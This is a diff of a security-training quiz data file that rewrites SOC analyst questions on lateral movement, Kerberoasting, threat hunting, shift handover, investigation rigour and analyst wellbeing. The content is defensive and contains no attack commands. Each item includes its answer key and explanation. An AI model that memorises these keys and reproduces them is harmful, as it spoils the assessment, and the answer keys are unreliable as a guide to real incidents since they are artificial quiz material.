+        explanation: "Persistent low-volume sessions are the signature of interactive shells (reverse SSH, custom C2). NetFlow alone is enough to spot them; pcap + EDR confirm."
       },
       {
         id: "q8-6",
-        question: "What is NetFlow used for?",
+        difficulty: "hard",
+        tags: ["Lateral Movement"],
+        scenario: "Internal east-west traffic spike: workstation 10.0.5.99 initiated 445/tcp (SMB) and 5985/tcp (WinRM) to 38 servers in 11 minutes, then 88/tcp (Kerberos) traffic patterns consistent with Kerberoasting requests.",
+        question: "What is happening?",
         options: [
-          "Replacing firewalls",
-          "Capturing connection metadata for traffic analysis",
-          "Blocking malware",
-          "Managing users"
+          "Inventory scan by IT",
+          "Active lateral movement + credential attack: SMB/WinRM sweep (T1021.002/.006) and Kerberoasting (T1558.003). Disable account, isolate host, alert IR — this is intrusion-in-progress",
+          "Backup software",
+          "Group Policy refresh"
         ],
         correctAnswer: 1,
-        explanation: "NetFlow captures connection metadata (IPs, ports, bytes, timing) for traffic analysis without storing full packet content."
-      },
-      {
-        id: "q8-7",
-        question: "What network pattern indicates port scanning?",
-        options: [
-          "Normal web traffic",
-          "Single source connecting to many destinations on multiple ports",
-          "Large file downloads",
-          "Email traffic"
-        ],
-        correctAnswer: 1,
-        explanation: "Port scanning shows a single source systematically connecting to many targets across multiple ports for reconnaissance."
-      },
-      {
-        id: "q8-8",
-        question: "What is the purpose of network segmentation?",
-        options: [
-          "To slow down the network",
-          "To limit lateral movement between zones",
-          "To increase attack surface",
-          "To remove firewalls"
-        ],
-        correctAnswer: 1,
-        explanation: "Network segmentation limits lateral movement by separating network zones with access controls between them."
-      },
-      {
-        id: "q8-9",
-        question: "Which protocol is commonly abused for C2 because it's rarely blocked?",
-        options: [
-          "FTP",
-          "DNS or HTTPS",
-          "Telnet",
-          "SMTP"
-        ],
-        correctAnswer: 1,
-        explanation: "DNS and HTTPS are commonly abused for C2 because they're rarely blocked and can blend with legitimate traffic."
-      },
-      {
-        id: "q8-10",
-        question: "What does a SYN flood attack target?",
-        options: [
-          "User passwords",
-          "Server resources by sending many SYN packets without completing handshakes",
-          "DNS records",
-          "Email servers only"
-        ],
-        correctAnswer: 1,
-        explanation: "SYN flood attacks exhaust server resources by sending many SYN packets without completing TCP handshakes."
-      },
-      {
-        id: "q8-11",
-        question: "What is signature-based detection's main limitation?",
-        options: [
-          "It's too accurate",
-          "It cannot detect unknown or new attacks",
-          "It works too fast",
-          "It's too cheap"
-        ],
-        correctAnswer: 1,
-        explanation: "Signature-based detection only identifies known attacks with existing signatures; it cannot detect zero-day or novel attacks."
-      },
-      {
-        id: "q8-12",
-        question: "What should you check when investigating a suspicious external connection?",
-        options: [
-          "Only the destination IP",
-          "IP reputation, domain age, traffic patterns, and related alerts",
-          "Just the timestamp",
-          "The user's lunch schedule"
-        ],
-        correctAnswer: 1,
-        explanation: "Investigate IP/domain reputation, when it was registered, traffic patterns, related alerts, and whether it's expected behavior."
-      },
-      {
-        id: "q8-13",
-        question: "What is WMI commonly used for in lateral movement?",
-        options: [
-          "Web browsing",
-          "Remote process execution on Windows systems",
-          "Email delivery",
-          "File compression"
-        ],
-        correctAnswer: 1,
-        explanation: "WMI (Windows Management Instrumentation) is commonly abused for remote process execution during lateral movement."
-      },
-      {
-        id: "q8-14",
-        question: "Which port is used for RDP?",
-        options: [
-          "22",
-          "443",
-          "3389",
-          "8080"
-        ],
-        correctAnswer: 2,
-        explanation: "RDP (Remote Desktop Protocol) uses port 3389 and is frequently targeted for unauthorized remote access."
-      },
-      {
-        id: "q8-15",
-        question: "What indicates potential data exfiltration in network traffic?",
-        options: [
-          "Normal browsing patterns",
-          "Large outbound transfers to unknown destinations, especially after hours",
-          "Inbound email traffic",
-          "Software updates"
-        ],
-        correctAnswer: 1,
-        explanation: "Large outbound data transfers to unknown destinations, especially outside business hours, may indicate data exfiltration."
+        explanation: "Burst SMB+WinRM fan-out plus Kerberos service-ticket requests for many SPNs is unmistakable Kerberoasting + LM. Speed matters — every minute is more compromised credentials."
       }
     ]
   },
   {
     quizId: "q9",
     courseId: "soc-fundamentals",
-    title: "SOC Best Practices Quiz",
-    description: "Final assessment covering investigation skills, career development, and analyst wellness.",
-    passingScore: 70,
+    title: "SOC Mastery: Hunting, Handover & Career",
+    description: "Synthesis quiz covering proactive hunting, shift handover discipline, investigation rigor, and analyst growth.",
+    passingScore: 75,
     timeLimit: 20,
     questions: [
       {
         id: "q9-1",
-        question: "What is the recommended investigation approach?",
+        difficulty: "medium",
+        tags: ["Hunting", "Hypothesis"],
+        scenario: "Your hunt-team lead says 'go hunt for ransomware.'",
+        question: "Which is the BEST hypothesis-driven hunt formulation?",
         options: [
-          "Jump to conclusions immediately",
-          "Observe, hypothesize, test, and conclude",
-          "Guess and move on",
-          "Only escalate everything"
+          "Search for 'ransomware' across all logs",
+          "Hypothesis: 'A ransomware operator has performed AD recon via BloodHound-like LDAP enumeration in the last 14 days.' Data: AD audit, Sysmon, EDR. Logic: spike in SAMR/LDAP enumeration per host vs. baseline. Validate, document, hand to detection eng if signal is real",
+          "Run a vulnerability scan",
+          "Block all SMB"
         ],
         correctAnswer: 1,
-        explanation: "A systematic approach: observe the evidence, form hypotheses, test them with additional data, then conclude based on findings."
+        explanation: "Threat hunting = a falsifiable hypothesis + a specific data source + a defined logic + an outcome (new detection, runbook, or 'no evidence'). 'Search for ransomware' is not a hunt."
       },
       {
         id: "q9-2",
-        question: "What is 'confirmation bias' in investigations?",
+        difficulty: "hard",
+        tags: ["Hunting Maturity"],
+        scenario: "Your SOC currently only reacts to alerts. Leadership wants to add hunting.",
+        question: "Which maturity progression is correct?",
         options: [
-          "Confirming alerts correctly",
-          "Seeking only evidence that supports your initial theory",
-          "Good documentation practice",
-          "A type of malware"
+          "Buy a hunt platform and hire 10 hunters",
+          "1) Establish telemetry coverage gaps vs. ATT&CK, 2) Start with intel-driven hunts (known TTPs), 3) Add hypothesis-driven hunts, 4) Mature to analytics/ML-assisted hunts, 5) Feedback loop: every successful hunt becomes a detection",
+          "Outsource everything",
+          "Disable existing alerts"
         ],
         correctAnswer: 1,
-        explanation: "Confirmation bias is seeking only evidence supporting your initial theory. Counter it by actively looking for contradicting data."
+        explanation: "Hunting maturity grows with telemetry, process, and feedback. Without ATT&CK coverage mapping you don't know what you can hunt; without the 'hunt -> detection' feedback loop you discover the same things forever."
       },
       {
         id: "q9-3",
-        question: "What is alert fatigue?",
+        difficulty: "medium",
+        tags: ["Handover"],
+        scenario: "End of your night shift. Active items:\n  - IR-441 ransomware contained, awaiting forensic image\n  - INC-887 user reported phishing; analyzed, malicious, awaiting recall\n  - 12 informational alerts deferred",
+        question: "What is the proper handover content?",
         options: [
-          "Being tired at work",
-          "Decreased vigilance due to overwhelming alert volume",
-          "A type of attack",
-          "Slow network connections"
+          "'All good, see you tomorrow'",
+          "For each open item: ticket ID, current state, next action with owner, blockers, decisions made (with rationale), and ETA. Plus environment-wide notes (e.g., 'elevated phishing volume from .ru domains tonight')",
+          "Just forward the ticket links",
+          "Verbal only; no notes"
         ],
         correctAnswer: 1,
-        explanation: "Alert fatigue occurs when analysts become desensitized to alerts due to high volumes, potentially missing real threats."
+        explanation: "Structured handover (state + next action + owner + decisions) prevents the most common SOC failure mode: dropped incidents at shift change. Environmental context primes the incoming shift for what to expect."
       },
       {
         id: "q9-4",
-        question: "What is a key sign of analyst burnout?",
+        difficulty: "hard",
+        tags: ["Investigation Rigor"],
+        scenario: "An analyst closes a ticket as 'False Positive — looks like normal admin activity.' No evidence captured, no pivots done.",
+        question: "What is wrong with this closure?",
         options: [
-          "Excitement about work",
-          "Chronic fatigue, cynicism, and decreased performance",
-          "Asking many questions",
-          "Taking notes"
+          "Nothing — analyst judgment is enough",
+          "No evidentiary basis is documented. Proper closure requires the evidence trail (who/what/when), the pivots performed (host process, account history, peer baseline), and the explicit reason it is benign. Otherwise it is unverifiable and may hide a real compromise",
+          "Should have escalated regardless",
+          "Should have called the user"
         ],
         correctAnswer: 1,
-        explanation: "Burnout signs include chronic fatigue, cynicism about work, feeling ineffective, and decreased performance."
+        explanation: "'Looks normal' is not a verdict. Documented closures are auditable, allow other analysts to learn, and protect the SOC if the case re-emerges. Quality bar: a stranger should be able to reproduce your verdict from the ticket alone."
       },
       {
         id: "q9-5",
-        question: "What is 'pivoting' in an investigation?",
+        difficulty: "medium",
+        tags: ["Bias", "Cognitive"],
+        scenario: "An analyst sees a familiar-looking PowerShell command line, recognizes it as 'last week's IT script,' closes the alert. It turns out to be a similar-but-malicious variant.",
+        question: "Which cognitive bias drove the error?",
         options: [
-          "Changing careers",
-          "Moving from one indicator to discover related indicators",
-          "Rotating your chair",
-          "Closing tickets"
+          "Anchoring",
+          "Recognition / availability bias — prior familiarity over-rode actual verification of the current artifact (hash, signature, parent, full command line)",
+          "Sunk-cost fallacy",
+          "Confirmation bias only"
         ],
         correctAnswer: 1,
-        explanation: "Pivoting means using one indicator to find related ones - like finding domains that resolve to a suspicious IP."
+        explanation: "Recognition bias is the SOC's silent killer. Defense: forced verification checklists ('compare hash, full command line, parent process, signature') prevent pattern-matching from substituting for evidence."
       },
       {
         id: "q9-6",
-        question: "What is the recommended certification for entry-level SOC analysts?",
+        difficulty: "medium",
+        tags: ["Career", "Growth"],
+        scenario: "A Tier 1 analyst wants to grow into detection engineering within 12 months.",
+        question: "Which growth plan is MOST realistic and impactful?",
         options: [
-          "CISSP",
-          "CompTIA Security+ or BTL1",
-          "PhD in Computer Science",
-          "No certification needed"
+          "Watch random YouTube videos",
+          "Build a home lab (Splunk/ELK + Sysmon + adversary emulation with Atomic Red Team / Caldera), contribute detections to Sigma, write 1 internal detection per month with metrics, study ATT&CK + the SOC's data sources, and shadow a senior on tuning",
+          "Apply for a manager role",
+          "Wait for the company to train them"
         ],
         correctAnswer: 1,
-        explanation: "CompTIA Security+ or Blue Team Level 1 (BTL1) are excellent entry-level certifications for aspiring SOC analysts."
+        explanation: "Detection engineering is a craft — lab reps + open-source contributions + measurable internal output + ATT&CK fluency + mentorship is the proven path. Passive learning rarely makes the jump."
       },
       {
         id: "q9-7",
-        question: "What should you do during work breaks?",
+        difficulty: "easy",
+        tags: ["Wellbeing"],
+        scenario: "You have worked a 12-hour shift with a major incident. Your replacement is 20 minutes late and you are exhausted.",
+        question: "Best decision?",
         options: [
-          "Continue monitoring alerts",
-          "Step away from screens and take actual breaks",
-          "Skip breaks to handle more alerts",
-          "Work on personal projects"
+          "Push through and keep handling alerts alone",
+          "Inform the duty manager, document the gap, hand over to whoever is on-call per policy, and log off; tired analysts make mistakes that cost more than a delayed handover",
+          "Falsify the handover",
+          "Stay silent until replacement arrives"
         ],
         correctAnswer: 1,
-        explanation: "Taking actual breaks away from screens is essential for preventing burnout and maintaining effectiveness."
-      },
-      {
-        id: "q9-8",
-        question: "What makes good investigation notes?",
-        options: [
-          "Brief with no details",
-          "Timestamped entries with observations, actions, and reasoning",
-          "Only the final conclusion",
-          "Personal opinions only"
-        ],
-        correctAnswer: 1,
-        explanation: "Good notes include timestamps, detailed observations, actions taken, reasoning, and evidence references."
-      },
-      {
-        id: "q9-9",
-        question: "What is the typical L1 to L2 analyst progression timeline?",
-        options: [
-          "1 week",
-          "2-4 years",
-          "10+ years",
-          "Never possible"
-        ],
-        correctAnswer: 1,
-        explanation: "Typically, analysts progress from L1 to L2 over 2-4 years as they develop deeper investigation and response skills."
-      },
-      {
-        id: "q9-10",
-        question: "What is essential for continuous learning in cybersecurity?",
-        options: [
-          "Only formal training",
-          "Combination of hands-on practice, certifications, and staying current with threats",
-          "Just reading news",
-          "Nothing - skills don't change"
-        ],
-        correctAnswer: 1,
-        explanation: "Continuous learning requires hands-on practice, certifications, reading threat intel, and staying current with evolving threats."
-      },
-      {
-        id: "q9-11",
-        question: "Which platform provides free SOC analyst practice labs?",
-        options: [
-          "Microsoft Word",
-          "TryHackMe or LetsDefend",
-          "Facebook",
-          "YouTube only"
-        ],
-        correctAnswer: 1,
-        explanation: "TryHackMe and LetsDefend offer free (and paid) SOC analyst training paths with hands-on labs and challenges."
-      },
-      {
-        id: "q9-12",
-        question: "What should you do if you're experiencing burnout symptoms?",
-        options: [
-          "Ignore them and work harder",
-          "Seek support from EAP, mental health professionals, or trusted colleagues",
-          "Quit immediately",
-          "Hide the symptoms"
-        ],
-        correctAnswer: 1,
-        explanation: "Seeking support is a sign of strength. Use EAP programs, mental health resources, or trusted colleagues when needed."
+        explanation: "Fatigue is a security control failure. Healthy SOCs have explicit escalation paths for late handovers. Burnout-driven errors are the most expensive bugs in the SOC."
       }
     ]
   },
